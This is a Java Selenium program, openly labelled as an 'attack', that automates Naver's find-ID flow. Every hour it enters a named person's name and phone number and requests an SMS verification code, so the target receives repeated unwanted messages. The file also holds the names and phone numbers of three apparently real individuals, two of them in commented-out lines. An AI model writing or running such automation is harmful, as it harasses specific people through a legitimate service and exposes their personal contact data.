package com.java.study.selenium;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;


public class 유기섭공격 {

    static int i = 1;


    public static void main(String[] args) throws Exception {
        ScheduledExecutorService exeService = Executors.newSingleThreadScheduledExecutor();

        System.out.println("스케줄러 준비 ...");
        exeService.scheduleAtFixedRate(() -> {
            try {
                System.out.println("김유섭을 공격합니다 ... ");
                attackMessage();
                System.out.println("김유섭 공격 완료 : " + i + "회 완료");
                i = i + 1;
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }, 0, 1, TimeUnit.HOURS);
    }

    private static void attackMessage() throws InterruptedException {
        System.setProperty("webdriver.chrome.driver", "C:\\chromedriver-win64\\chromedriver.exe");

//        String url = "https://nid.naver.com/user2/help/idInquiry?m=viewInputUserInfo&token_help=AWhDbnhhJRAPypU3";
        String url = "https://www.naver.com/";

        ChromeOptions options = new ChromeOptions();
        options.setHeadless(false);     // false : gui, true: none

        // Initialize ChromeDriver
        WebDriver driver = new ChromeDriver(options);


        driver.get(url);

//        String userName = "김준호";
//        String phone = "01052470295";

//        String userName = "김성준";
//        String phone = "01020735689";

        String userName = "김유섭";
        String phone = "01046351321";


        try {

            WebElement aTag = driver.findElement(By.cssSelector("a.MyView-module__link_more___sbxGh"));
            aTag.click();

            WebElement findId = driver.findElement(By.cssSelector("button.id_item"));
            findId.click();


            WebElement phoneNm = driver.findElement(By.id("phoneNm"));
            phoneNm.sendKeys(userName);

            WebElement phoneNo = driver.findElement(By.id("phoneNo"));
            phoneNo.sendKeys(phone);

            WebElement btnPhoneAuthNo = driver.findElement(By.id("btnPhoneAuthNo"));
            btnPhoneAuthNo.click();

            Thread.sleep(2000);

        } catch (Exception e) {
            e.printStackTrace();
            throw new RuntimeException("");
        } finally {
            Thread.sleep(5000);
            driver.quit();
        }
    }


}




















